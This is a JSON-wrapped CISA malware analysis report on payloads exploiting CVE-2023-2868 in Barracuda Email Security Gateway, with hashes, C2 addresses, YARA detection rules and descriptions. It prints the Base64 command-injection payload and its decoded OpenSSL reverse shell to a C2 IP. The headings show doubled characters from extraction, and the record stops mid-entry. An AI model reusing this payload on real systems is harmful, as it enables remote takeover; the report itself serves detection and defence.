{
    "id": "0c7f9d29-d9b1-4717-bb03-7322d3b3f640",
    "created_at": "2025-01-27T02:05:04.576861Z",
    "updated_at": "2025-03-27T02:05:49.173712Z",
    "deleted_at": null,
    "sha1_hash": "d1a2ad5c5ea75f05d67f37f2d80ab88d80db7cf5",
    "title": "MAR-10454006.r3.v1.CLEAR",
    "authors": "",
    "file_creation_date": "2023-07-27T20:12:57Z",
    "file_modification_date": "2023-07-27T20:12:57Z",
    "file_size": 591938,
    "plain_text": "## 10454006.r3.v1\n\n# Malware Analysis Report 2023-07-27\n\n\n## NNoottiiffiiccaattiioonn\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any\nwarranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service\nreferenced in this bulletin or otherwise.\nThis document is marked TLP:CLEAR--Recipients may share this information without restriction. Sources may use TLP:CLEAR when\ninformation carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release.\nSubject to standard copyright rules, TLP:CLEAR information may be shared without restriction. For more information on the Traffic Light\nProtocol (TLP), see http://www.cisa.gov/tlp.\n\n## SSuummmmaarryy\n\n\nDDeessccrriippttiioonn\n\n\nCISA obtained 14 malware samples comprised of Barracuda exploit payloads and reverse shell backdoors. The malware was used by\nthreat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email\nSecurity Gateway (ESG).\n\nThe payload triggers a command injection (exploiting CVE-2023-2868), leading to dropping and execution of reverse shells on the ESG\nappliance. The reverse shells establish backdoor communications via OpenSSL with threat actor command and control (C2) servers. The\nactors delivered this payload to the victim via a phishing email with a malicious .tar attachment.\n\nFor information about related malware, specifically information on other backdoors, see CISA Alert: CISA Releases Malware Analysis\nReports on Barracuda Backdoors.\n\n\nSSuubbmmiitttteedd FFiilleess ((1144))\n\n\n0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6 (1665808485-0a151737759a8a30001...)\n2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b (abcdefgc2V0c2lkIHNoIC1jICJta2Z...)\n2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095 (1665807519-0a151737759a87f0001...)\n2b2b7c5e825b7a18e13319b4a1275a0dd0086abd58b2d45939269d5a613a41e7 (abcdefgc2V0c2lkIHNoIC1jICJta2Z...)\n3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7 (1666612441-0a151727b565980001-...)\n80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043 (1666612600-0a151727b265b10001-...)\n949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788 (snapshot.tar)\n9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5 (1666612304-0a151727b165810001-...)\nb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321 (1666582925-0a151727b55a9c0001-...)\nb52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2 (1666583888-0a151727b45ada0001-...)\ncaa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd (1665808277-0a1517307c0bbc0001-...)\ncf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba (1665808153-0a1517307c0bb70001-...)\nf289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0 (snapshot0.tar)\nf536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa (1666614870-0a151727b166b50001-...)\n\n\nIIPPss ((22))\n\n\n107[.]148[.]219[.]54\n107[.]148[.]223[.]196\n\n## FFiinnddiinnggss\n\n\n-----\n\n22aa886600884499aa99ee6688ddff00005533555566bb8855ff2200001100aa11338844bb44cc8877559944bbaa44ff99bbbb33ee11bb11dd228877bb009955\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1665807519-0a151737759a87f0001-RIRGpJ\n\nSSiizzee 29888 bytes\n\nTTyyppee ASCII text\n\nMMDD55 5bbdcca59916d40c178fd29a743fc9eb\n\nSSHHAA11 4bd4f014ceeffbe2b1e61f5d279416a80ec9eafe\n\nSSHHAA225566 2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\n\nSSHHAA551122 17a07d6d3164159ace01099bdee560bd63f980d083b6a1650880b50bcfe63b9eda8b1ba7932c7527457d368005d61\n745a21fa4252a9e2b81ea3a9a34e4d33ea0\nssssddeeeepp 96:e1mfYp+YQicdb34VB+1jhuBj1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6Uq:pW+UOb3QBkjh89H4q6fbP\n\nEEnnttrrooppyy 1.661629\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n\n\n-----\n\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n2a860849a9... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis file is related to the vulnerability CVE-2023-2868 in the Barracuda ESG exploit to execute a reverse shell payload on certain ESG\nappliances. This sample contains a Base64 encoded block that upon decoding references multiple archive files. There are multiple file\nreferences in the block, however, only one contains the exploit code in the title and can be found between two single quotes and\nbackticks '`abcdefg=payload`' (Figure 1). This payload triggers a command injection and upon successful exploitation of the affected\nsystem the encoded commands are able to run and provide the Threat Actor (TA) with a response.\n\n--Begin Encoded Payload-'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u\nbmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64\n-d|${G}h;wh66489.txt`'\n--End Encoded Payload-\nThe encoded block above decodes to a reverse shell seen below.\n\n--Begin Decoded Command-setsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:8080 >/tmp/p 2>/dev/null;rm\n/tmp/p\"\n--End Decoded Command-\nThis reverse shell starts a new session and sets it to run in the background. Then it creates the named pipe \"/tmp/p\" that it will use as a\npoint to transfer the commands that will be executed.\n\nThe rest of the command is seen using OpenSSL to create a client that connects to the Command-and-Control (C2) at Internet Protocol\n(IP) address “107[.]148[.]223[.]196” and port number “8080.” The OpenSSL command also suppresses session and certificate output\ninfo using -quiet flag and errors are discarded for stealth in the /dev/null directory. Finally, the named pipe \"tmp/p\" is removed when\nthe OpenSSL connection is closed.\n\n\nSSccrreeeennsshhoottss\n\n\n-----\n\nFFiigguurree 11.. -- Base64 encoded block decodes to another Base64 encoded payload.\n\nccff00999966aa33aaeeee114488bbcc006600ff44772266443355dddd00dd77ff11aaff7799008822227777ff440077ddffaa0077dd8811118811332222bbaa\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1665808153-0a1517307c0bb70001-RIRGpJ\n\nSSiizzee 29887 bytes\n\nTTyyppee ASCII text\n\nMMDD55 1424d7cf2515f97e21bbd9c94d187dab\n\nSSHHAA11 f7df6eb42ce9979babbd9fb1373bbf260dcfe4e5\n\nSSHHAA225566 cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\n\nSSHHAA551122 febc0f0bee4b8a4209a7768cf2285550b571506f9d56ffbdf5a262f81d4e28df38e8e78691f05ee408ef464715e21360\n2860332e638d28e0976e56a8fc587662\nssssddeeeepp 96:i1mJ5p+Yuicd4344D+7jhugE1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6UH:7j+yO435DOjhu9H4q6fbC\n\nEEnnttrrooppyy 1.661365\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\n\n\n-----\n\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\ncf0996a3ae... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.”\n\nccaaaa779955cc44cc993344221199dd228877337799bb2200cc22991122aaff00ff881155ddee9955bbbb7733ee00ff0022ff55ffee66eebb99aaaa5500bbdd\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1665808277-0a1517307c0bbc0001-RIRGpJ\n\nSSiizzee 29887 bytes\n\nTTyyppee ASCII text\n\nMMDD55 bd238e645c350329b0a42264dc6fdea7\n\nSSHHAA11 f61238d4bbe1927e827ffd03457c1d60b1ce6350\n\nSSHHAA225566 caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\n\nSSHHAA551122 fc298c3cee79f2d965d8464746dea4259209bd5f7bb4ee2825e92ca1fad2b65c9b02d93406da8de1c7f2e3e0a08b2a\n430f95b0b55e009f2ff71e0f4fa6305f52\nssssddeeeepp 96:71mv1p+YQicdcs45k+Ujhu0w1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6Ujn:6X+0OcsQkNjhe9H4q6fb2\n\nEEnnttrrooppyy 1.662428\n\n\n-----\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\ncaa795c4c9... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.”\n\n00bb991177dd994455aa77449911886699ffaa55000033ff66bb8855cc0099ff55ff4455779955aa77885522aa88bb6633bbaa11aabbddcc99779977dd66aa66\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1665808485-0a151737759a8a30001-RIRGpJ\n\n\n-----\n\nSSiizzee 29888 bytes\n\nTTyyppee ASCII text\n\nMMDD55 3e01f48ab1bfae888b2c580dbc6c5962\n\nSSHHAA11 6f7d8d31d1d0c53d71495176aa4ab23756bbba24\n\nSSHHAA225566 0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\n\nSSHHAA551122 ea5b2437c99c766050fddc2cad00b3d863ceae41d7d0be2b67ded74b146800de2ef7261d003d1bb341a8cff4ddd789f\n2c615daa423d9ab2a7f04b3a1d353d2eb\nssssddeeeepp 96:+1mAIp+Y/icd7s42dB+1jhPBD1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6Ua:em+ZO7sfBkjh79H4q6fbf\n\nEEnnttrrooppyy 1.662592\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n0b917d945a... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\n-----\n\nThis artifact contains the same payloads as “2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.”\n\nbb55111133ee2299eecc2233ff66ee11bbee228899bb9999ddcc77aacc22aaff11cc225522bb44bb66ffff66ee997777ff77882277aabb77ffdd668866332211\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1666582925-0a151727b55a9c0001-RIRGpJ\n\nSSiizzee 29883 bytes\n\nTTyyppee ASCII text\n\nMMDD55 db1215b51c86aa12564dd5b825e81e43\n\nSSHHAA11 a3b9b846467973038b1232f2c2189c02023b1dd8\n\nSSHHAA225566 b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\n\nSSHHAA551122 4b0be07290895cfae3e29d7675c83ee48e0f3eedab6be55db5d426799cbc25905eecfba92664bf3137c610cfca74826\ne2c2ec813ca6ff7c23c5584258219b478\nssssddeeeepp 96:LRKtqi+YiFOiclLs42dB+1jhtVP1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6U2:Ny+xFJYLsfBkjhJLH4q6fbD\n\nEEnnttrrooppyy 1.661150\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\n\n\n-----\n\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\nb5113e29ec... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64\nencoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shell establishes\nconnections using the \"OpenSSL\" to the C2 IP \"107[.]148[.]223[.]196\" and port “443” and redirects the standard input and output to\nthe named pipe at \"/tmp/p\" and then removes \"/tmp/p\" after the connection is closed.\n\n--Begin Encoded Payload-'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u\nbmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o\n$abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\n--End Encoded Payload-\n--Begin Decoded Payload-setsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:443 >/tmp/p 2>/dev/null;rm\n/tmp/p\"\n--End Decoded Payload-\nbb5522aa99884444dd88336688aabbee7700bb66bbaa00dd88ddff8844ff8888cc88cc00002299ddccbbccff559999666655aaccdd770033bb225555dd55dd22\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1666583888-0a151727b45ada0001-RIRGpJ\n\nSSiizzee 29883 bytes\n\nTTyyppee ASCII text\n\nMMDD55 c479667bd581845d1e295becc1d4859f\n\nSSHHAA11 a982111f1463e90a46a62da4fb8e47bbf4db025e\n\nSSHHAA225566 b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\n\nSSHHAA551122 834fbf3c821a27588d6c7b46c56296505bdb9e34880e7c3c234c7fa3f9ee46c115d632d413f13278b9de792b5bd8e8\n7ab561ad50bd8a25d43dbafa9b22b8bc30\nssssddeeeepp 96:GhKWqi+YDeiclHs42B+1jhtNzfH1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6UG:Et+I5YHs7BkjhPLdLH4q6fbT\n\nEEnnttrrooppyy 1.661755\n\n\nAAnnttiivviirruuss\n\n\nEESSEETT Linux/Exploit.CVE-2023-2868.A trojan\n\n\nYYAARRAA RRuulleess\n\n\n\n- rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10454006\"\nDate = \"2023-07-05\"\nLast_Modified = \"20230712_1400\"\nActor = \"n/a\"\nFamily = \"n/a\"\n\n\n-----\n\nCapabilities = \"accesses-remote-machines communicates-with-c2\"\nMalware_Type = \"trojan backdoor remote-access-trojan\"\nTool_Type = \"unknown\"\nDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\nSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\nSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\nSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\nSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\nSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\nSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\nSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\nSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\nSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\nSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\nstrings:\n$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n$s4 = { 5a 45 63 78 64 }\n$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n$s7 = { 4c 6e 52 34 64 41 }\ncondition:\n5 of them\n}\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\nb52a9844d8... Connected_To 107[.]148[.]223[.]196\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains the same payloads as “b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.”\n\n99dd00cc77aa4455dddd0000dd3311aa99772244ffaa99ee9966ccbb88aacc9999dddd55aa66550022ffee44551155cceeddaaaabbbb22ee5588bb11cc55ff55\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee 1666612304-0a151727b165810001-RIRGpJ\n\nSSiizzee 29883 bytes\n\nTTyyppee ASCII text\n\nMMDD55 33d16ab60d262191f4a251e31a5d1940\n\nSSHHAA11 15e3a9a643ebc5fc8e240b2617ce9720e4c16aa2\n\nSSHHAA225566 